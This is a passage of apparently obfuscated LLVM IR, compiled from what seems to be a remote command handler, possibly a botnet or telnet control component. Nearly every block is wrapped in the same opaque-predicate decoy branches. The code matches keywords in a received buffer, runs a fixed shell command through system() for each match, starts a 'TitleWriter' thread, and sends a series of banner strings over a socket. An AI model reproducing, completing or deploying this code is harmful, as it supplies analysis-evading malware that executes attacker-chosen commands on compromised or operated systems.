  %829 = icmp eq i32 %828, 0
  %830 = icmp slt i32 %825, 10
  %831 = or i1 %829, %830
  br i1 %831, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %823
  %832 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.52, i32 0, i32 0))
  %833 = load i32, i32* @x.15
  %834 = load i32, i32* @y.16
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %561

; <label>:841:                                    ; preds = %819
  %842 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %843 = call i8* @strstr(i8* %842, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.53, i32 0, i32 0)) #8
  %844 = icmp ne i8* %843, null
  br i1 %844, label %845, label %847

; <label>:845:                                    ; preds = %841
  %846 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.54, i32 0, i32 0))
  br label %561

; <label>:847:                                    ; preds = %841
  %848 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %849 = call i8* @strstr(i8* %848, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i32 0, i32 0)) #8
  %850 = icmp ne i8* %849, null
  br i1 %850, label %851, label %853

; <label>:851:                                    ; preds = %847
  %852 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.56, i32 0, i32 0))
  br label %561

; <label>:853:                                    ; preds = %847
  %854 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %855 = call i8* @strstr(i8* %854, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i32 0, i32 0)) #8
  %856 = icmp ne i8* %855, null
  br i1 %856, label %857, label %859

; <label>:857:                                    ; preds = %853
  %858 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.58, i32 0, i32 0))
  br label %561

; <label>:859:                                    ; preds = %853
  %860 = load i32, i32* @x.15
  %861 = load i32, i32* @y.16
  %862 = sub i32 %860, 1
  %863 = mul i32 %860, %862
  %864 = urem i32 %863, 2
  %865 = icmp eq i32 %864, 0
  %866 = icmp slt i32 %861, 10
  %867 = or i1 %865, %866
  br i1 %867, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %859
  %868 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %869 = call i8* @strstr(i8* %868, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0)) #8
  %870 = icmp ne i8* %869, null
  %871 = load i32, i32* @x.15
  %872 = load i32, i32* @y.16
  %873 = sub i32 %871, 1
  %874 = mul i32 %871, %873
  %875 = urem i32 %874, 2
  %876 = icmp eq i32 %875, 0
  %877 = icmp slt i32 %872, 10
  %878 = or i1 %876, %877
  br i1 %878, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %870, label %879, label %897

; <label>:879:                                    ; preds = %originalBBpart2122
  %880 = load i32, i32* @x.15
  %881 = load i32, i32* @y.16
  %882 = sub i32 %880, 1
  %883 = mul i32 %880, %882
  %884 = urem i32 %883, 2
  %885 = icmp eq i32 %884, 0
  %886 = icmp slt i32 %881, 10
  %887 = or i1 %885, %886
  br i1 %887, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %879
  %888 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.60, i32 0, i32 0))
  %889 = load i32, i32* @x.15
  %890 = load i32, i32* @y.16
  %891 = sub i32 %889, 1
  %892 = mul i32 %889, %891
  %893 = urem i32 %892, 2
  %894 = icmp eq i32 %893, 0
  %895 = icmp slt i32 %890, 10
  %896 = or i1 %894, %895
  br i1 %896, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %561

; <label>:897:                                    ; preds = %originalBBpart2122
  %898 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %899 = call i8* @strstr(i8* %898, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i32 0, i32 0)) #8
  %900 = icmp ne i8* %899, null
  br i1 %900, label %901, label %919

; <label>:901:                                    ; preds = %897
  %902 = load i32, i32* @x.15
  %903 = load i32, i32* @y.16
  %904 = sub i32 %902, 1
  %905 = mul i32 %902, %904
  %906 = urem i32 %905, 2
  %907 = icmp eq i32 %906, 0
  %908 = icmp slt i32 %903, 10
  %909 = or i1 %907, %908
  br i1 %909, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %901
  %910 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.62, i32 0, i32 0))
  %911 = load i32, i32* @x.15
  %912 = load i32, i32* @y.16
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %561

; <label>:919:                                    ; preds = %897
  %920 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %921 = call i8* @strstr(i8* %920, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.63, i32 0, i32 0)) #8
  %922 = icmp ne i8* %921, null
  br i1 %922, label %923, label %925

; <label>:923:                                    ; preds = %919
  %924 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.64, i32 0, i32 0))
  br label %561

; <label>:925:                                    ; preds = %919
  %926 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %927 = call i8* @strstr(i8* %926, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i32 0, i32 0)) #8
  %928 = icmp ne i8* %927, null
  br i1 %928, label %929, label %947

; <label>:929:                                    ; preds = %925
  %930 = load i32, i32* @x.15
  %931 = load i32, i32* @y.16
  %932 = sub i32 %930, 1
  %933 = mul i32 %930, %932
  %934 = urem i32 %933, 2
  %935 = icmp eq i32 %934, 0
  %936 = icmp slt i32 %931, 10
  %937 = or i1 %935, %936
  br i1 %937, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %929
  %938 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.66, i32 0, i32 0))
  %939 = load i32, i32* @x.15
  %940 = load i32, i32* @y.16
  %941 = sub i32 %939, 1
  %942 = mul i32 %939, %941
  %943 = urem i32 %942, 2
  %944 = icmp eq i32 %943, 0
  %945 = icmp slt i32 %940, 10
  %946 = or i1 %944, %945
  br i1 %946, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %561

; <label>:947:                                    ; preds = %925
  %948 = load i32, i32* @x.15
  %949 = load i32, i32* @y.16
  %950 = sub i32 %948, 1
  %951 = mul i32 %948, %950
  %952 = urem i32 %951, 2
  %953 = icmp eq i32 %952, 0
  %954 = icmp slt i32 %949, 10
  %955 = or i1 %953, %954
  br i1 %955, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %947
  %956 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %957 = call i8* @strstr(i8* %956, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i32 0, i32 0)) #8
  %958 = icmp ne i8* %957, null
  %959 = load i32, i32* @x.15
  %960 = load i32, i32* @y.16
  %961 = sub i32 %959, 1
  %962 = mul i32 %959, %961
  %963 = urem i32 %962, 2
  %964 = icmp eq i32 %963, 0
  %965 = icmp slt i32 %960, 10
  %966 = or i1 %964, %965
  br i1 %966, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %958, label %967, label %969

; <label>:967:                                    ; preds = %originalBBpart2138
  %968 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.68, i32 0, i32 0))
  br label %561

; <label>:969:                                    ; preds = %originalBBpart2138
  %970 = load i32, i32* @x.15
  %971 = load i32, i32* @y.16
  %972 = sub i32 %970, 1
  %973 = mul i32 %970, %972
  %974 = urem i32 %973, 2
  %975 = icmp eq i32 %974, 0
  %976 = icmp slt i32 %971, 10
  %977 = or i1 %975, %976
  br i1 %977, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %969
  %978 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %979 = call i8* @strstr(i8* %978, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i32 0, i32 0)) #8
  %980 = icmp ne i8* %979, null
  %981 = load i32, i32* @x.15
  %982 = load i32, i32* @y.16
  %983 = sub i32 %981, 1
  %984 = mul i32 %981, %983
  %985 = urem i32 %984, 2
  %986 = icmp eq i32 %985, 0
  %987 = icmp slt i32 %982, 10
  %988 = or i1 %986, %987
  br i1 %988, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br i1 %980, label %989, label %1007

; <label>:989:                                    ; preds = %originalBBpart2142
  %990 = load i32, i32* @x.15
  %991 = load i32, i32* @y.16
  %992 = sub i32 %990, 1
  %993 = mul i32 %990, %992
  %994 = urem i32 %993, 2
  %995 = icmp eq i32 %994, 0
  %996 = icmp slt i32 %991, 10
  %997 = or i1 %995, %996
  br i1 %997, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %989
  %998 = call i32 @system(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.70, i32 0, i32 0))
  %999 = load i32, i32* @x.15
  %1000 = load i32, i32* @y.16
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br label %561

; <label>:1007:                                   ; preds = %originalBBpart2142
  %1008 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1009 = call i8* @strstr(i8* %1008, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0)) #8
  %1010 = icmp ne i8* %1009, null
  br i1 %1010, label %1011, label %1506

; <label>:1011:                                   ; preds = %1007
  %1012 = load i8*, i8** %3, align 8
  %1013 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1012) #7
  %1014 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i32 0, i32 0
  %1015 = call i32 (i8*, i8*, ...) @sprintf(i8* %1014, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.72, i32 0, i32 0)) #7
  %1016 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i32 0, i32 0
  %1017 = call i32 (i8*, i8*, ...) @sprintf(i8* %1016, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.73, i32 0, i32 0)) #7
  %1018 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %1019 = call i32 (i8*, i8*, ...) @sprintf(i8* %1018, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.74, i32 0, i32 0)) #7
  %1020 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %1021 = call i32 (i8*, i8*, ...) @sprintf(i8* %1020, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.75, i32 0, i32 0)) #7
  %1022 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %1023 = call i32 (i8*, i8*, ...) @sprintf(i8* %1022, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.76, i32 0, i32 0)) #7
  %1024 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %1025 = call i32 (i8*, i8*, ...) @sprintf(i8* %1024, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.77, i32 0, i32 0)) #7
  %1026 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %1027 = call i32 (i8*, i8*, ...) @sprintf(i8* %1026, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.78, i32 0, i32 0)) #7
  %1028 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %1029 = call i32 (i8*, i8*, ...) @sprintf(i8* %1028, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.79, i32 0, i32 0)) #7
  %1030 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %1031 = call i32 (i8*, i8*, ...) @sprintf(i8* %1030, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.80, i32 0, i32 0)) #7
  %1032 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %1033 = call i32 (i8*, i8*, ...) @sprintf(i8* %1032, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.81, i32 0, i32 0)) #7
  %1034 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %1035 = call i32 (i8*, i8*, ...) @sprintf(i8* %1034, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.82, i32 0, i32 0)) #7
  %1036 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %1037 = call i32 (i8*, i8*, ...) @sprintf(i8* %1036, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.83, i32 0, i32 0)) #7
  %1038 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %1039 = call i32 (i8*, i8*, ...) @sprintf(i8* %1038, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.84, i32 0, i32 0)) #7
  %1040 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %1041 = call i32 (i8*, i8*, ...) @sprintf(i8* %1040, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.85, i32 0, i32 0)) #7
  %1042 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %1043 = call i32 (i8*, i8*, ...) @sprintf(i8* %1042, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.86, i32 0, i32 0)) #7
  %1044 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %1045 = call i32 (i8*, i8*, ...) @sprintf(i8* %1044, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.87, i32 0, i32 0)) #7
  %1046 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %1047 = call i32 (i8*, i8*, ...) @sprintf(i8* %1046, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.88, i32 0, i32 0)) #7
  %1048 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %1049 = call i32 (i8*, i8*, ...) @sprintf(i8* %1048, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.89, i32 0, i32 0)) #7
  %1050 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %1051 = call i32 (i8*, i8*, ...) @sprintf(i8* %1050, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.90, i32 0, i32 0)) #7
  %1052 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %1053 = call i32 (i8*, i8*, ...) @sprintf(i8* %1052, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.91, i32 0, i32 0)) #7
  %1054 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %1055 = call i32 (i8*, i8*, ...) @sprintf(i8* %1054, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.92, i32 0, i32 0)) #7
  %1056 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %1057 = call i32 (i8*, i8*, ...) @sprintf(i8* %1056, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.93, i32 0, i32 0)) #7
  %1058 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %1059 = call i32 (i8*, i8*, ...) @sprintf(i8* %1058, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.94, i32 0, i32 0)) #7
  %1060 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %1061 = call i32 (i8*, i8*, ...) @sprintf(i8* %1060, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.95, i32 0, i32 0)) #7
  %1062 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %1063 = call i32 (i8*, i8*, ...) @sprintf(i8* %1062, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.96, i32 0, i32 0)) #7
  %1064 = load i32, i32* %4, align 4
  %1065 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i32 0, i32 0
  %1066 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i32 0, i32 0
  %1067 = call i64 @strlen(i8* %1066) #8
  %1068 = call i64 @send(i32 %1064, i8* %1065, i64 %1067, i32 16384)
  %1069 = icmp eq i64 %1068, -1
  br i1 %1069, label %1070, label %1087

; <label>:1070:                                   ; preds = %1011
  %1071 = load i32, i32* @x.15
  %1072 = load i32, i32* @y.16
  %1073 = sub i32 %1071, 1
  %1074 = mul i32 %1071, %1073
  %1075 = urem i32 %1074, 2
  %1076 = icmp eq i32 %1075, 0
  %1077 = icmp slt i32 %1072, 10
  %1078 = or i1 %1076, %1077
  br i1 %1078, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %1070
  %1079 = load i32, i32* @x.15
  %1080 = load i32, i32* @y.16
  %1081 = sub i32 %1079, 1
  %1082 = mul i32 %1079, %1081
  %1083 = urem i32 %1082, 2
  %1084 = icmp eq i32 %1083, 0
  %1085 = icmp slt i32 %1080, 10
  %1086 = or i1 %1084, %1085
  br i1 %1086, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br label %1940

; <label>:1087:                                   ; preds = %1011
  %1088 = load i32, i32* %4, align 4
  %1089 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i32 0, i32 0
  %1090 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i32 0, i32 0
  %1091 = call i64 @strlen(i8* %1090) #8
  %1092 = call i64 @send(i32 %1088, i8* %1089, i64 %1091, i32 16384)
  %1093 = icmp eq i64 %1092, -1
  br i1 %1093, label %1094, label %1095

; <label>:1094:                                   ; preds = %1087
  br label %1940

; <label>:1095:                                   ; preds = %1087
  %1096 = load i32, i32* %4, align 4
  %1097 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %1098 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %1099 = call i64 @strlen(i8* %1098) #8
  %1100 = call i64 @send(i32 %1096, i8* %1097, i64 %1099, i32 16384)
  %1101 = icmp eq i64 %1100, -1
  br i1 %1101, label %1102, label %1103

; <label>:1102:                                   ; preds = %1095
  br label %1940

; <label>:1103:                                   ; preds = %1095
  %1104 = load i32, i32* %4, align 4
  %1105 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %1106 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %1107 = call i64 @strlen(i8* %1106) #8
  %1108 = call i64 @send(i32 %1104, i8* %1105, i64 %1107, i32 16384)
  %1109 = icmp eq i64 %1108, -1
  br i1 %1109, label %1110, label %1111

; <label>:1110:                                   ; preds = %1103
  br label %1940

; <label>:1111:                                   ; preds = %1103
  %1112 = load i32, i32* @x.15
  %1113 = load i32, i32* @y.16
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %1111
  %1120 = load i32, i32* %4, align 4
  %1121 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %1122 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %1123 = call i64 @strlen(i8* %1122) #8
  %1124 = call i64 @send(i32 %1120, i8* %1121, i64 %1123, i32 16384)
  %1125 = icmp eq i64 %1124, -1
  %1126 = load i32, i32* @x.15
  %1127 = load i32, i32* @y.16
  %1128 = sub i32 %1126, 1
  %1129 = mul i32 %1126, %1128
  %1130 = urem i32 %1129, 2
  %1131 = icmp eq i32 %1130, 0
  %1132 = icmp slt i32 %1127, 10
  %1133 = or i1 %1131, %1132
  br i1 %1133, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br i1 %1125, label %1134, label %1135

; <label>:1134:                                   ; preds = %originalBBpart2154
  br label %1940

; <label>:1135:                                   ; preds = %originalBBpart2154
  %1136 = load i32, i32* %4, align 4
  %1137 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %1138 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %1139 = call i64 @strlen(i8* %1138) #8
  %1140 = call i64 @send(i32 %1136, i8* %1137, i64 %1139, i32 16384)
  %1141 = icmp eq i64 %1140, -1
  br i1 %1141, label %1142, label %1143

; <label>:1142:                                   ; preds = %1135
  br label %1940

; <label>:1143:                                   ; preds = %1135
  %1144 = load i32, i32* %4, align 4
  %1145 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %1146 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %1147 = call i64 @strlen(i8* %1146) #8
  %1148 = call i64 @send(i32 %1144, i8* %1145, i64 %1147, i32 16384)
  %1149 = icmp eq i64 %1148, -1
  br i1 %1149, label %1150, label %1167

; <label>:1150:                                   ; preds = %1143
  %1151 = load i32, i32* @x.15
  %1152 = load i32, i32* @y.16
  %1153 = sub i32 %1151, 1
  %1154 = mul i32 %1151, %1153
  %1155 = urem i32 %1154, 2
  %1156 = icmp eq i32 %1155, 0
  %1157 = icmp slt i32 %1152, 10
  %1158 = or i1 %1156, %1157
  br i1 %1158, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %1150
  %1159 = load i32, i32* @x.15
  %1160 = load i32, i32* @y.16
  %1161 = sub i32 %1159, 1
  %1162 = mul i32 %1159, %1161
  %1163 = urem i32 %1162, 2
  %1164 = icmp eq i32 %1163, 0
  %1165 = icmp slt i32 %1160, 10
  %1166 = or i1 %1164, %1165
  br i1 %1166, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br label %1940

; <label>:1167:                                   ; preds = %1143
  %1168 = load i32, i32* %4, align 4
  %1169 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %1170 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %1171 = call i64 @strlen(i8* %1170) #8
  %1172 = call i64 @send(i32 %1168, i8* %1169, i64 %1171, i32 16384)
  %1173 = icmp eq i64 %1172, -1
  br i1 %1173, label %1174, label %1175

; <label>:1174:                                   ; preds = %1167
  br label %1940

; <label>:1175:                                   ; preds = %1167
  %1176 = load i32, i32* @x.15
  %1177 = load i32, i32* @y.16
  %1178 = sub i32 %1176, 1
  %1179 = mul i32 %1176, %1178
  %1180 = urem i32 %1179, 2
  %1181 = icmp eq i32 %1180, 0
  %1182 = icmp slt i32 %1177, 10
  %1183 = or i1 %1181, %1182
  br i1 %1183, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %1175
  %1184 = load i32, i32* %4, align 4
  %1185 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %1186 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %1187 = call i64 @strlen(i8* %1186) #8
  %1188 = call i64 @send(i32 %1184, i8* %1185, i64 %1187, i32 16384)
  %1189 = icmp eq i64 %1188, -1
  %1190 = load i32, i32* @x.15
  %1191 = load i32, i32* @y.16
  %1192 = sub i32 %1190, 1
  %1193 = mul i32 %1190, %1192
  %1194 = urem i32 %1193, 2
  %1195 = icmp eq i32 %1194, 0
  %1196 = icmp slt i32 %1191, 10
  %1197 = or i1 %1195, %1196
  br i1 %1197, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br i1 %1189, label %1198, label %1199

; <label>:1198:                                   ; preds = %originalBBpart2162
  br label %1940

; <label>:1199:                                   ; preds = %originalBBpart2162
  %1200 = load i32, i32* %4, align 4
  %1201 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %1202 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %1203 = call i64 @strlen(i8* %1202) #8
  %1204 = call i64 @send(i32 %1200, i8* %1201, i64 %1203, i32 16384)
  %1205 = icmp eq i64 %1204, -1
  br i1 %1205, label %1206, label %1223

; <label>:1206:                                   ; preds = %1199
  %1207 = load i32, i32* @x.15
  %1208 = load i32, i32* @y.16
  %1209 = sub i32 %1207, 1
  %1210 = mul i32 %1207, %1209
  %1211 = urem i32 %1210, 2
  %1212 = icmp eq i32 %1211, 0
  %1213 = icmp slt i32 %1208, 10
  %1214 = or i1 %1212, %1213
  br i1 %1214, label %originalBB164, label %originalBB164alteredBB

originalBB164:                                    ; preds = %originalBB164alteredBB, %1206
  %1215 = load i32, i32* @x.15
  %1216 = load i32, i32* @y.16
  %1217 = sub i32 %1215, 1
  %1218 = mul i32 %1215, %1217
  %1219 = urem i32 %1218, 2
  %1220 = icmp eq i32 %1219, 0
  %1221 = icmp slt i32 %1216, 10
  %1222 = or i1 %1220, %1221
  br i1 %1222, label %originalBBpart2166, label %originalBB164alteredBB

originalBBpart2166:                               ; preds = %originalBB164
  br label %1940

; <label>:1223:                                   ; preds = %1199
  %1224 = load i32, i32* @x.15
  %1225 = load i32, i32* @y.16
  %1226 = sub i32 %1224, 1
  %1227 = mul i32 %1224, %1226
  %1228 = urem i32 %1227, 2
  %1229 = icmp eq i32 %1228, 0
  %1230 = icmp slt i32 %1225, 10
  %1231 = or i1 %1229, %1230
  br i1 %1231, label %originalBB168, label %originalBB168alteredBB

originalBB168:                                    ; preds = %originalBB168alteredBB, %1223
  %1232 = load i32, i32* %4, align 4
  %1233 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %1234 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %1235 = call i64 @strlen(i8* %1234) #8
  %1236 = call i64 @send(i32 %1232, i8* %1233, i64 %1235, i32 16384)
  %1237 = icmp eq i64 %1236, -1
  %1238 = load i32, i32* @x.15
  %1239 = load i32, i32* @y.16
  %1240 = sub i32 %1238, 1
  %1241 = mul i32 %1238, %1240
  %1242 = urem i32 %1241, 2
  %1243 = icmp eq i32 %1242, 0
  %1244 = icmp slt i32 %1239, 10
  %1245 = or i1 %1243, %1244
  br i1 %1245, label %originalBBpart2170, label %originalBB168alteredBB

originalBBpart2170:                               ; preds = %originalBB168
  br i1 %1237, label %1246, label %1263

; <label>:1246:                                   ; preds = %originalBBpart2170
  %1247 = load i32, i32* @x.15
  %1248 = load i32, i32* @y.16
  %1249 = sub i32 %1247, 1
  %1250 = mul i32 %1247, %1249
  %1251 = urem i32 %1250, 2
  %1252 = icmp eq i32 %1251, 0
  %1253 = icmp slt i32 %1248, 10
  %1254 = or i1 %1252, %1253
  br i1 %1254, label %originalBB172, label %originalBB172alteredBB

originalBB172:                                    ; preds = %originalBB172alteredBB, %1246
  %1255 = load i32, i32* @x.15
  %1256 = load i32, i32* @y.16
  %1257 = sub i32 %1255, 1
  %1258 = mul i32 %1255, %1257
  %1259 = urem i32 %1258, 2
  %1260 = icmp eq i32 %1259, 0
  %1261 = icmp slt i32 %1256, 10
  %1262 = or i1 %1260, %1261
  br i1 %1262, label %originalBBpart2174, label %originalBB172alteredBB

originalBBpart2174:                               ; preds = %originalBB172
  br label %1940

; <label>:1263:                                   ; preds = %originalBBpart2170
  %1264 = load i32, i32* %4, align 4
  %1265 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %1266 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %1267 = call i64 @strlen(i8* %1266) #8
  %1268 = call i64 @send(i32 %1264, i8* %1265, i64 %1267, i32 16384)
  %1269 = icmp eq i64 %1268, -1
  br i1 %1269, label %1270, label %1287

; <label>:1270:                                   ; preds = %1263
  %1271 = load i32, i32* @x.15
  %1272 = load i32, i32* @y.16
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %1270
